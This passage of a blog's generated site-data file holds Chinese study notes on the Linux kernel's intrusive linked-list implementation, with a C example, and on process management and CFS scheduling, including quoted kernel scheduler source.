class=\"keyword\">struct</span> foo *second= (<span class=\"keyword\">struct</span> foo *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> foo));</div><div class=\"line\">    first-&gt;id = <span class=\"number\">999</span>;</div><div class=\"line\">    second-&gt;id = <span class=\"number\">888</span>;</div><div class=\"line\">    list_add(&amp;first-&gt;entry,&amp;fo.entry);</div><div class=\"line\">    list_add_tail(&amp;second-&gt;entry,&amp;fo.entry);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">struct</span> foo *iterator;</div><div class=\"line\">    list_for_each_entry(iterator, &amp;fo.entry, entry) &#123;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"id=%d\\n\"</span>,iterator-&gt;id);</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">struct</span> foo  *next;</div><div class=\"line\">\tlist_for_each_entry_safe(iterator, next, &amp;fo.entry, entry) &#123;</div><div class=\"line\">\t\t<span class=\"comment\">//\tlist_del(&amp;iterator-&gt;entry);</span></div><div class=\"line\"><span class=\"comment\">//\t\tfree(iterator);</span></div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"empty ? %d\\n\"</span>,list_empty(&amp;fo.entry));</div><div class=\"line\">\tfirst = list_first_entry(&amp;fo.entry, <span class=\"keyword\">struct</span> foo, entry);</div><div class=\"line\"></div><div class=\"line\">    list_for_each_entry(iterator, &amp;fo.entry, entry) &#123;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"id=%d\\n\"</span>,iterator-&gt;id);</div><div class=\"line\">    &#125;</div><div class=\"line\">\t<span class=\"built_in\">free</span>(first);</div><div class=\"line\">\t<span class=\"built_in\">free</span>(second);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><p>链表是我们学习数据结构课程中首先学的并且是最为基础且最重要的一种数据结构类型。<br>可以用一种最简单的数据结构来表示这样的一个链表：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> list_element&#123;</div><div class=\"line\">\t<span class=\"keyword\">void</span>* data;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* next;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<p>双向链表：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> list_element&#123;</div><div class=\"line\">\t<span class=\"keyword\">void</span>* data;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* pre;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* next;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<h2 id=\"Linux内核中的实现\"><a href=\"#Linux内核中的实现\" class=\"headerlink\" title=\"Linux内核中的实现\"></a>Linux内核中的实现</h2><p>相比普通的链表实现方式，Linux内核的实现可以说独树一帜。前面提到的数据通过内部添加一个指向数据的next（或者pre）节点指针，才能串联在链表中。比如，假设我们有一个fox数据结构来表述狐狸：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> fox &#123;</div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> tail_length;<span class=\"comment\">//尾巴长度</span></div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> weight;<span class=\"comment\">//重量</span></div><div class=\"line\">    <span class=\"keyword\">bool</span> is_fantastic;<span class=\"comment\">//是否奇妙</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>存储这个结构到链表里的通常方法是在数据结构中嵌入一个链表指针，比如：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> fox &#123;</div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> tail_length;<span class=\"comment\">//尾巴长度</span></div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> weight;<span class=\"comment\">//重量</span></div><div class=\"line\">    <span class=\"keyword\">bool</span> is_fantastic;<span class=\"comment\">//是否奇妙</span></div><div class=\"line\">    <span class=\"keyword\">struct</span> fox *next;</div><div class=\"line\">    <span class=\"keyword\">struct</span> fox *prev;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><strong>Linux内核方式与众不同，它不是将数据结构塞入链表，而是将链表节点塞入数据结构！！</strong><br>链表代码在头文件<code>&lt;linux/list.h&gt;</code>其数据结构很简单：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> list_head &#123;</div><div class=\"line\">    <span class=\"keyword\">struct</span> list_head *next;</div><div class=\"line\">    <span class=\"keyword\">struct</span> list_head *prev;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><code>next</code>指针指向下一个链表节点，<code>prev</code>指针指向前一个。然而，似乎这里还看不出它们有多大作用。到底什么才是链表存储的具体内容呢？其实关键在于理解<code>list_head</code>结构是如何使用的。<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">struct</span> fox &#123;</div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> tail_length;<span class=\"comment\">//尾巴长度</span></div><div class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> weight;<span class=\"comment\">//重量</span></div><div class=\"line\">    <span class=\"keyword\">bool</span> is_fantastic;<span class=\"comment\">//是否奇妙 </span></div><div class=\"line\">    <span class=\"keyword\">struct</span> list_head <span class=\"built_in\">list</span>;<span class=\"comment\">//所有fox结构体形成链表</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>上述结构中，fox中的<code>list.next</code>指向下一个元素，<code>list.prev</code>指向前一个元素。现在链表已经能用了，但是显然还不够方便。因此<strong>内核又提供了一组链表操作例程。</strong>比如，<code>list_add()</code>方法假如一个新节点到链表中。但是，这些方法都有一个统一的特点：它们只接受list_head结构作为参数。使用宏<code>container_of()</code>我们可以很方便地从链表指针找到父结构中包含的任何变量。<strong>这是因为在C语言中，一个给定结构中的变量偏移在编译时地址就被ABI固定下来了。</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> container_of(ptr, type, member) \\</div><div class=\"line\">    (type *)((char *)(ptr) - (char *) &amp;((type *)0)-&gt;member)</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"操作链表\"><a href=\"#操作链表\" class=\"headerlink\" title=\"操作链表\"></a>操作链表</h2><ul>\n<li>增加节点：<blockquote>\n<p>list_add(struct list_head <em>new,struct list_head </em>head);</p>\n</blockquote>\n</li>\n<li>删除节点：<blockquote>\n<p>list_del(struct list_head *entry);</p>\n</blockquote>\n</li>\n<li>移动和合并链表节点<blockquote>\n<p>list_move(struct list_head <em>list,struct list_head </em>head);</p>\n</blockquote>\n</li>\n<li>较差链表是否为空：<blockquote>\n<p>list_empty(struct list_head *head);</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"遍历链表\"><a href=\"#遍历链表\" class=\"headerlink\" title=\"遍历链表\"></a>遍历链表</h2><ul>\n<li>常用的遍历方法<blockquote>\n<p>list_for_each_entry(pos,head,member)</p>\n</blockquote>\n</li>\n<li>反向遍历<blockquote>\n<p>list_for_each_entry_reverse(pos,head,member);</p>\n</blockquote>\n</li>\n<li>遍历的同时删除<blockquote>\n<p>list_for_each_entry_safe(pos,next,head,member);</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"完整例程\"><a href=\"#完整例程\" class=\"headerlink\" title=\"完整例程\"></a>完整例程</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stddef.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"include/list.h\"</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> foo&#123;</div><div class=\"line\">    <span class=\"keyword\">int</span> id;</div><div class=\"line\">    <span class=\"keyword\">struct</span> list_head entry;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"hello world!\\n\"</span>);</div><div class=\"line\">    <span class=\"keyword\">struct</span> foo fo;</div><div class=\"line\">    INIT_LIST_HEAD(&amp;fo.entry);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">struct</span> foo *first = (<span class=\"keyword\">struct</span> foo *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> foo));</div><div class=\"line\">    <span class=\"keyword\">struct</span> foo *second= (<span class=\"keyword\">struct</span> foo *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> foo));</div><div class=\"line\">    first-&gt;id = <span class=\"number\">999</span>;</div><div class=\"line\">    second-&gt;id = <span class=\"number\">888</span>;</div><div class=\"line\">    list_add(&amp;first-&gt;entry,&amp;fo.entry);</div><div class=\"line\">    list_add_tail(&amp;second-&gt;entry,&amp;fo.entry);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">struct</span> foo *iterator;</div><div class=\"line\">    list_for_each_entry(iterator, &amp;fo.entry, entry) &#123;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"id=%d\\n\"</span>,iterator-&gt;id);</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">struct</span> foo  *next;</div><div class=\"line\">\tlist_for_each_entry_safe(iterator, next, &amp;fo.entry, entry) &#123;</div><div class=\"line\">\t\t<span class=\"comment\">//\tlist_del(&amp;iterator-&gt;entry);</span></div><div class=\"line\"><span class=\"comment\">//\t\tfree(iterator);</span></div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"empty ? %d\\n\"</span>,list_empty(&amp;fo.entry));</div><div class=\"line\">\tfirst = list_first_entry(&amp;fo.entry, <span class=\"keyword\">struct</span> foo, entry);</div><div class=\"line\"></div><div class=\"line\">    list_for_each_entry(iterator, &amp;fo.entry, entry) &#123;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"id=%d\\n\"</span>,iterator-&gt;id);</div><div class=\"line\">    &#125;</div><div class=\"line\">\t<span class=\"built_in\">free</span>(first);</div><div class=\"line\">\t<span class=\"built_in\">free</span>(second);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n"},{"title":"Linux内核设计与实现-进程管理与进程调度","date":"2017-01-15T03:15:04.000Z","_content":"## 第三章：进程管理\n**简单记录看书看到的一些和自己之前理解有出入的点，做个记录：**\n\n- 进程号的最大值是多少，能否调整大小？\n> 最大进程数，默认在`cat /proc/sys/kernel/pid_max` 32768（short int短整型的最大值），可直接修改提高\n\n- fork()写时拷贝：只有在需要写入的时候，数据才会被复制。\n- 线程在Linux中的实现，\n> 从内核的角度来说，它并没有线程这个概念。Linux把所有的线程都当作进程来实现。\n\n- 内核是如何组织管理进程列表的？\n> 双向循环列表，why？进程本身是树状的，有继承关系，父进程、子进程、兄弟进程。\n\n- 进程描述符的结构\n> 大约1.7KB,代码492行，接近500行！！！主要包括：打开的文件，进程的地址空间，挂起的信号，进程状态，父进程，子进程\n\n- 虚拟地址空间和物理地址空间的区别？\n- 各种内存malloc区别？tcmalloc,kmalloc,malloc,jemalloc\n\n## 第四章：进程调度\n### 一、基础概念\n#### 1. 多任务系统概念\n多任务系统分为：非抢占式多任务和抢占式多任务。Linux提供了抢占式多任务模式。在此模式下，由调度程序来决定什么时候停止一个进程的运行。而非抢占式多任务模式则是只能由进程自己土洞停止运行，否则一直执行。    \n\n#### 2. 进程调度策略\n调度策略通常要在两个矛盾的目标总结寻找平衡感：进程响应速度（响应时间短）和最大系统利用率（高吞吐量）。\n\n#### 3. 进程优先级\n调度算法中最基本的一类就是基于优先级调度。优先级高的进程先运行，低的后运行。相同优先级轮转调度。   \nLinux采用了两种不同的优先级范围：  \n第一种是nice值，它的范围从`-20`到`+19`,默认值为0，越大优先级越低（nice可以理解为对其他进程的友好程度）。 \n> 可以通过`ps -el `查看nice值  \n\n第二种范围是实时优先级，其值是可配置的。默认情况下变化范围从0到99，越高进程优先级越高。\n\n#### 4. 时间片概念\n除了优先级，另外一个很重要的指标就是时间片。它标明进程在被抢占前所能持续运行的时间。调度策略必须规定一个默认的时间片，但这不是一件简单的事。   \n时间片过长会导致系统对交互的响应表现欠佳，让人觉得系统无法并发执行应用程序；时间片太短会明显增大进程切换带来的处理器耗时，因为肯定会有相当一部分系统时间用在进程切换上，而这些进程能够用来运行的时间片却很短。\n\n### 二、Unix系统中的进程调度\n在讨论公平调度算法前，我们必须首先认识一下传统Unix系统的调度过程。现代进程调度器有两个通用的概念（上面提到的）：进程优先级和时间片。优先级以nice值形式输出给用户空间。  \n优先级越高的进程赋予的时间片越多，可以简单理解一个优先级与时间片的映射，比如noce值为0（最高优先级）对应100ms的时间片，nice值为+20（最低优先级）对应5ms的时间片。每一个nice值对应一个时间片长度。  \n但是，这种方式听起来简单也很好理解，但会引发很多反常问题:\n\n1. 若要将nice值映射到时间片，就必然需要将nice单位值对于到处理器的绝对时间，但这样做将会导致经常切换无法最优进行。举例说明：  \n   假设有两个可运行状态的进程，nice值分别为0（对应100ms）和+20（对应5ms），两个进程分别获得的20/21(100ms)的处理器时间，和1/21(5ms)的处理器时间。  \n    另一种情况，如果是两个同等优先级的进程各自能获得一般的处理器时间，对于两个nice值为+20的每次能获得50%的处理器时间，即5ms。\n相比刚才例子中105ms内进行一次上下文切换，想着则需要在10ms内继续进行两次上下文切换。**显然，我们看到这些时间片的分配方式并不是很理想：它们是给定nice值到时间片映射与进程运行优先级混合的共同作用结果。**\n2. nice值与时间片映射关系合理性问题。假如nice值0和1，被分别映射到时间片100ms和95ms，它们的时间片几乎一样，假设18和19的nice值分别映射为10ms和5ms，那么前者相比后者获得了两倍的处理器时间！把进程的nice值减小1所带来的效果极大地取决于其nice初始值。\n\n## 三、CFS公平调度\n\n### 1. 概念\n\n对于上述的问题，CFS采用的方式是对时间片分配方式进行根本性的重新设计：**完全摒弃时间片而是分配给进程一个处理器使用比重。**通俗来讲，废弃nice值对应时间片的映射，而是采用nice值权重来分配处理器时间。      \n先看两个概念：   \n- 目标延迟：权重的时间分母值，每个进程按其权重在目标延迟时间内的长短，比如目标延迟为20ms，则每个进程根据权重分配20ms中的时间；   \n- 最小粒度：每个进程按权重分配后得到的时间片不能小于最小粒度，默认是1ms，就是每个进程最低也能获得1ms的时间片执行时间。  \n\n### 2. 实现\nCFS调度算法相关代码位于文件`kernel/sched_fair.c`中，核心关注四个组成部分：\n\n#### 2.1 时间记账\n所有的调度器都必须对进程运行时间做记账。  \nCFS使用调度器实体结构（`struct_sched_entity`）来追踪进程运行记账：\n```cpp\nstruct sched_entity{\n    ...\n    u64   vruntime;\n    ...\n}\n\n```\n`vruntime`变量存放进程的虚拟运行时间，该运行时间的计算是经过了所有可运行进程总数的标准化。虚拟时间是以ns为单位。\n\n#### 2.2 进程调度\n当CFS需要选择下一个运行进程时，它会挑一个具有最小vruntime的进程。这其实就是CFS调度算法的核心：**选择具有最小vruntime的任务。**   \nCFS使用**红黑树**来组织可运行进程队列，并利用其迅速找到最小vruntime值的进程。（注：每个nice值维护一个红黑树）\n红黑树相关维护操作：  \n- 挑选下一个任务：选取待运行的下一个进程，是所有vruntime最小的那个，它对于的便是树中最左侧的叶子结点。\n- 先树中加入进程：但进程变为可运行状态或者是通过fork()调用第一次创建时执行。\n- 从书中删除进程：发生在进程堵塞或者终止时\n\n#### 2.3 调度器入口\n进程调度的主要入口是函数`schedule()`，该函数中唯一重要的事情是，它会调用`pick_next_task()`。`pick_next_task()`会以优先级为序，从高到低，依次检查每一个调度类，并且从最高优先级的调度器类中，选择最高优先级的进程：\n> http://lxr.free-electrons.com/source/kernel/sched/core.c#L3259\n```cpp\n/*\n* Pick up the highest-prio task:\n*/\nstatic inline struct task_struct *\npick_next_task(struct rq *rq, struct task_struct *prev, struct pin_cookie cookie)\n{\n\t const struct sched_class *class = &fair_sched_class;\n\t struct task_struct *p;\n\n\t /*\n\t  * Optimization: we know that if all tasks are in\n\t  * the fair class we can call that function directly:\n\t  */\n\t if (likely(prev->sched_class == class &&\n\t\t\t\trq->nr_running == rq->cfs.h_nr_running)) {\n\t\t\t p = fair_sched_class.pick_next_task(rq, prev, cookie);\n\t\t\t if (unlikely(p == RETRY_TASK))\n\t\t\t\t\t goto again;\n\n\t\t\t /* assumes fair_sched_class->next == idle_sched_class */\n\t\t\t if (unlikely(!p))\n\t\t\t\t\t p = idle_sched_class.pick_next_task(rq, prev, cookie);\n\n\t\t\t return p;\n\t }\n\nagain:\n\t for_each_class(class) {\n\t\t\t p = class->pick_next_task(rq, prev, cookie);\n\t\t\t if (p) {\n\t\t\t\t\t if (unlikely(p == RETRY_TASK))\n\t\t\t\t\t\t\t goto again;\n\t\t\t\t\t return p;\n\t\t\t }\n\t }\n\n\t BUG(); /* the idle class will always have a runnable task */\n }\n\n```\n\n#### 2.4 睡眠和唤醒\n休眠（被阻塞）的进程处于一个特殊的不可执行状态。  \n进程休眠有多种原因，但肯定都是为了等待一些事件。事件可能是从文件I/O读更多数据，或者是某个硬件事件。\n休眠通过等待队列进行处理。等待队列是由等待某些事件发生的进程组成的简单链表。\n唤醒操作通过函数`wake_up`进行，它会唤醒指定的等待队列上的所有进程。\n\n\n","source":"_posts/Linux内核设计与实现-进程管理与进程调度.md","raw":"---\ntitle: Linux内核设计与实现-进程管理与进程调度\ndate: 2017-01-15 11:15:04\ncategories: Linux内核\n---\n## 第三章：进程管理\n**简单记录看书看到的一些和自己之前理解有出入的点，做个记录：**\n\n- 进程号的最大值是多少，能否调整大小？\n> 最大进程数，默认在`cat /proc/sys/kernel/pid_max` 32768（short int短整型的最大值），可直接修改提高\n\n- fork()写时拷贝：只有在需要写入的时候，数据才会被复制。\n- 线程在Linux中的实现，\n> 从内核的角度来说，它并没有线程这个概念。Linux把所有的线程都当作进程来实现。\n\n- 内核是如何组织管理进程列表的？\n> 双向循环列表，why？进程本身是树状的，有继承关系，父进程、子进程、兄弟进程。\n\n- 进程描述符的结构\n> 大约1.7KB,代码492行，接近500行！！！主要包括：打开的文件，进程的地址空间，挂起的信号，进程状态，父进程，子进程\n\n- 虚拟地址空间和物理地址空间的区别？\n- 各种内存malloc区别？tcmalloc,kmalloc,malloc,jemalloc\n\n## 第四章：进程调度\n### 一、基础概念\n#### 1. 多任务系统概念\n多任务系统分为：非抢占式多任务和抢占式多任务。Linux提供了抢占式多任务模式。在此模式下，由调度程序来决定什么时候停止一个进程的运行。而非抢占式多任务模式则是只能由进程自己土洞停止运行，否则一直执行。    \n\n#### 2. 进程调度策略\n调度策略通常要在两个矛盾的目标总结寻找平衡感：进程响应速度（响应时间短）和最大系统利用率（高吞吐量）。\n\n#### 3. 进程优先级\n调度算法中最基本的一类就是基于优先级调度。优先级高的进程先运行，低的后运行。相同优先级轮转调度。   \nLinux采用了两种不同的优先级范围：  \n第一种是nice值，它的范围从`-20`到`+19`,默认值为0，越大优先级越低（nice可以理解为对其他进程的友好程度）。 \n> 可以通过`ps -el `查看nice值  \n\n第二种范围是实时优先级，其值是可配置的。默认情况下变化范围从0到99，越高进程优先级越高。\n\n#### 4. 时间片概念\n除了优先级，另外一个很重要的指标就是时间片。它标明进程在被抢占前所能持续运行的时间。调度策略必须规定一个默认的时间片，但这不是一件简单的事。   \n时间片过长会导致系统对交互的响应表现欠佳，让人觉得系统无法并发执行应用程序；时间片太短会明显增大进程切换带来的处理器耗时，因为肯定会有相当一部分系统时间用在进程切换上，而这些进程能够用来运行的时间片却很短。\n\n### 二、Unix系统中的进程调度\n在讨论公平调度算法前，我们必须首先认识一下传统Unix系统的调度过程。现代进程调度器有两个通用的概念（上面提到的）：进程优先级和时间片。优先级以nice值形式输出给用户空间。  \n优先级越高的进程赋予的时间片越多，可以简单理解一个优先级与时间片的映射，比如noce值为0（最高优先级）对应100ms的时间片，nice值为+20（最低优先级）对应5ms的时间片。每一个nice值对应一个时间片长度。  \n但是，这种方式听起来简单也很好理解，但会引发很多反常问题:\n\n1. 若要将nice值映射到时间片，就必然需要将nice单位值对于到处理器的绝对时间，但这样做将会导致经常切换无法最优进行。举例说明：  \n   假设有两个可运行状态的进程，nice值分别为0（对应100ms）和+20（对应5ms），两个进程分别获得的20/21(100ms)的处理器时间，和1/21(5ms)的处理器时间。  \n    另一种情况，如果是两个同等优先级的进程各自能获得一般的处理器时间，对于两个nice值为+20的每次能获得50%的处理器时间，即5ms。\n相比刚才例子中105ms内进行一次上下文切换，想着则需要在10ms内继续进行两次上下文切换。**显然，我们看到这些时间片的分配方式并不是很理想：它们是给定nice值到时间片映射与进程运行优先级混合的共同作用结果。**\n2. nice值与时间片映射关系合理性问题。假如nice值0和1，被分别映射到时间片100ms和95ms，它们的时间片几乎一样，假设18和19的nice值分别映射为10ms和5ms，那么前者相比后者获得了两倍的处理器时间！把进程的nice值减小1所带来的效果极大地取决于其nice初始值。\n\n## 三、CFS公平调度\n\n### 1. 概念\n\n对于上述的问题，CFS采用的方式是对时间片分配方式进行根本性的重新设计：**完全摒弃时间片而是分配给进程一个处理器使用比重。**通俗来讲，废弃nice值对应时间片的映射，而是采用nice值权重来分配处理器时间。      \n先看两个概念：   \n- 目标延迟：权重的时间分母值，每个进程按其权重在目标延迟时间内的长短，比如目标延迟为20ms，则每个进程根据权重分配20ms中的时间；   \n- 最小粒度：每个进程按权重分配后得到的时间片不能小于最小粒度，默认是1ms，就是每个进程最低也能获得1ms的时间片执行时间。  \n\n### 2. 实现\nCFS调度算法相关代码位于文件`kernel/sched_fair.c`中，核心关注四个组成部分：\n\n#### 2.1 时间记账\n所有的调度器都必须对进程运行时间做记账。  \nCFS使用调度器实体结构（`struct_sched_entity`）来追踪进程运行记账：\n```cpp\nstruct sched_entity{\n    ...\n    u64   vruntime;\n    ...\n}\n\n```\n`vruntime`变量存放进程的虚拟运行时间，该运行时间的计算是经过了所有可运行进程总数的标准化。虚拟时间是以ns为单位。\n\n#### 2.2 进程调度\n当CFS需要选择下一个运行进程时，它会挑一个具有最小vruntime的进程。这其实就是CFS调度算法的核心：**选择具有最小vruntime的任务。**   \nCFS使用**红黑树**来组织可运行进程队列，并利用其迅速找到最小vruntime值的进程。（注：每个nice值维护一个红黑树）\n红黑树相关维护操作：  \n- 挑选下一个任务：选取待运行的下一个进程，是所有vruntime最小的那个，它对于的便是树中最左侧的叶子结点。\n- 先树中加入进程：但进程变为可运行状态或者是通过fork()调用第一次创建时执行。\n- 从书中删除进程：发生在进程堵塞或者终止时\n\n#### 2.3 调度器入口\n进程调度的主要入口是函数`schedule()`，该函数中唯一重要的事情是，它会调用`pick_next_task()`。`pick_next_task()`会以优先级为序，从高到低，依次检查每一个调度类，并且从最高优先级的调度器类中，选择最高优先级的进程：\n> http://lxr.free-electrons.com/source/kernel/sched/core.c#L3259\n```cpp\n/*\n* Pick up the highest-prio task:\n*/\nstatic inline struct task_struct *\npick_next_task(struct rq *rq, struct task_struct *prev, struct pin_cookie cookie)\n{\n\t const struct sched_class *class = &fair_sched_class;\n\t struct task_struct *p;\n\n\t /*\n\t  * Optimization: we know that if all tasks are in\n\t  * the fair class we can call that function directly:\n\t  */\n\t if (likely(prev->sched_class == class &&\n\t\t\t\trq->nr_running == rq->cfs.h_nr_running)) {\n\t\t\t p = fair_sched_class.pick_next_task(rq, prev, cookie);\n\t\t\t if (unlikely(p == RETRY_TASK))\n\t\t\t\t\t goto again;\n\n\t\t\t /* assumes fair_sched_class->next == idle_sched_class */\n\t\t\t if (unlikely(!p))\n\t\t\t\t\t p = idle_sched_class.pick_next_task(rq, prev, cookie);\n\n\t\t\t return p;\n\t }\n\nagain:\n\t for_each_class(class) {\n\t\t\t p = class->pick_next_task(rq, prev, cookie);\n\t\t\t if (p) {\n\t\t\t\t\t if (unlikely(p == RETRY_TASK))\n\t\t\t\t\t\t\t goto again;\n\t\t\t\t\t return p;\n\t\t\t }\n\t }\n\n\t BUG(); /* the idle class will always have a runnable task */\n }\n\n```\n\n#### 2.4 睡眠和唤醒\n休眠（被阻塞）的进程处于一个特殊的不可执行状态。  \n进程休眠有多种原因，但肯定都是为了等待一些事件。事件可能是从文件I/O读更多数据，或者是某个硬件事件。\n休眠通过等待队列进行处理。等待队列是由等待某些事件发生的进程组成的简单链表。\n唤醒操作通过函数`wake_up`进行，它会唤醒指定的等待队列上的所有进程。\n\n\n","slug":"Linux内核设计与实现-进程管理与进程调度","published":1,"updated":"2017-01-15T03:16:27.064Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cixyddgqq00050dtqpxzyvjl0","content":"<h2 id=\"第三章：进程管理\"><a href=\"#第三章：进程管理\" class=\"headerlink\" title=\"第三章：进程管理\"></a>第三章：进程管理</h2><p><strong>简单记录看书看到的一些和自己之前理解有出入的点，做个记录：</strong></p>\n<ul>\n<li><p>进程号的最大值是多少，能否调整大小？</p>\n<blockquote>\n<p>最大进程数，默认在<code>cat /proc/sys/kernel/pid_max</code> 32768（short int短整型的最大值），可直接修改提高</p>\n</blockquote>\n</li>\n<li><p>fork()写时拷贝：只有在需要写入的时候，数据才会被复制。</p>\n</li>\n<li><p>线程在Linux中的实现，</p>\n<blockquote>\n<p>从内核的角度来说，它并没有线程这个概念。Linux把所有的线程都当作进程来实现。</p>\n</blockquote>\n</li>\n<li><p>内核是如何组织管理进程列表的？</p>\n<blockquote>\n<p>双向循环列表，why？进程本身是树状的，有继承关系，父进程、子进程、兄弟进程。</p>\n</blockquote>\n</li>\n<li><p>进程描述符的结构</p>\n<blockquote>\n<p>大约1.7KB,代码492行，接近500行！！！主要包括：打开的文件，进程的地址空间，挂起的信号，进程状态，父进程，子进程</p>\n</blockquote>\n</li>\n<li><p>虚拟地址空间和物理地址空间的区别？</p>\n</li>\n<li>各种内存malloc区别？tcmalloc,kmalloc,malloc,jemalloc</li>\n</ul>\n<h2 id=\"第四章：进程调度\"><a href=\"#第四章：进程调度\" class=\"headerlink\" title=\"第四章：进程调度\"></a>第四章：进程调度</h2><h3 id=\"一、基础概念\"><a href=\"#一、基础概念\" class=\"headerlink\" title=\"一、基础概念\"></a>一、基础概念</h3><h4 id=\"1-多任务系统概念\"><a href=\"#1-多任务系统概念\" class=\"headerlink\" title=\"1. 多任务系统概念\"></a>1. 多任务系统概念</h4><p>多任务系统分为：非抢占式多任务和抢占式多任务。Linux提供了抢占式多任务模式。在此模式下，由调度程序来决定什么时候停止一个进程的运行。而非抢占式多任务模式则是只能由进程自己土洞停止运行，否则一直执行。    </p>\n<h4 